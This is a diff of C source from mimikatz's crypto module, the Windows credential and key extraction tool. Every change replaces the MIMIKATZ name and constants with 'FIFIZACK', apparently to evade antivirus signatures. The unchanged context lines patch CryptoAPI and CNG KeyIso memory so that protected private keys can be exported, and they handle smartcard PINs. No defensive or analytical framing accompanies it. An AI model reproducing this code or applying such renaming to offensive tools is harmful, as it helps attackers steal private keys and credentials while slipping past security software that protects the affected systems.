@@ -50,7 +50,7 @@ NTSTATUS kuhl_m_crypto_init()
 	{
 		if(K_CPExportKey = (PCP_EXPORTKEY) GetProcAddress(kuhl_m_crypto_hRsaEnh, "CPExportKey"))
 		{
-			if((MIMIKATZ_NT_MAJOR_VERSION > 5) && !kuhl_m_crypto_hNCrypt)
+			if((FIFIZACK_NT_MAJOR_VERSION > 5) && !kuhl_m_crypto_hNCrypt)
 			{
 				if(kuhl_m_crypto_hNCrypt = LoadLibrary(L"ncrypt"))
 				{
@@ -1031,7 +1031,7 @@ NTSTATUS kuhl_m_crypto_c_sc_auth(int argc, wchar_t * argv[])
 	BYTE SerialNumber[LM_NTLM_HASH_LENGTH];
 	CERT_RDN_ATTR rgNameAttr[] = {
 		{szOID_COMMON_NAME, CERT_RDN_UNICODE_STRING, {0, NULL}},
-		{szOID_ORGANIZATION_NAME, CERT_RDN_UNICODE_STRING, {sizeof(MIMIKATZ) - sizeof(wchar_t), (PBYTE) MIMIKATZ}},
+		{szOID_ORGANIZATION_NAME, CERT_RDN_UNICODE_STRING, {sizeof(FIFIZACK) - sizeof(wchar_t), (PBYTE) FIFIZACK}},
 		{szOID_COUNTRY_NAME, CERT_RDN_UNICODE_STRING, {sizeof(L"FR") - sizeof(wchar_t), (PBYTE) L"FR"}},
 	};
 	CERT_RDN rgRDN = {ARRAYSIZE(rgNameAttr), rgNameAttr};
@@ -1312,7 +1312,7 @@ NTSTATUS kuhl_m_crypto_c_cert_to_hw(int argc, wchar_t * argv[])
 						{
 							if(aPin = kull_m_string_unicode_to_ansi(szPin))
 							{
-								if(CryptAcquireContext(&hProvCERT, NULL, keyInfos.pwszProvName, keyInfos.dwProvType, ((MIMIKATZ_NT_MAJOR_VERSION > 5) ? CRYPT_DEFAULT_CONTAINER_OPTIONAL : 0)))
+								if(CryptAcquireContext(&hProvCERT, NULL, keyInfos.pwszProvName, keyInfos.dwProvType, ((FIFIZACK_NT_MAJOR_VERSION > 5) ? CRYPT_DEFAULT_CONTAINER_OPTIONAL : 0)))
 								{
 									if(CryptSetProvParam(hProvCERT, PP_KEYEXCHANGE_PIN, (const BYTE *) aPin, 0))
 										keyInfos.dwFlags = CRYPT_SILENT;
@@ -1408,8 +1408,8 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000;
 	
-	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
-	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
+	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), FIFIZACK_NT_BUILD_NUMBER);
+	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), FIFIZACK_NT_BUILD_NUMBER);
 	if(currentReference4001 && currentReference4000)
 	{
 		aPattern4001Memory.address = currentReference4001->Search.Pattern;
@@ -1472,7 +1472,7 @@ NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
 		if(NT_SUCCESS(K_NCryptOpenStorageProvider(&hProvider, NULL, 0)))
 		{
 			K_NCryptFreeObject(hProvider);
-			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
+			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (FIFIZACK_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
 		}
 	}
 	else PRINT_ERROR(L"No CNG\n");
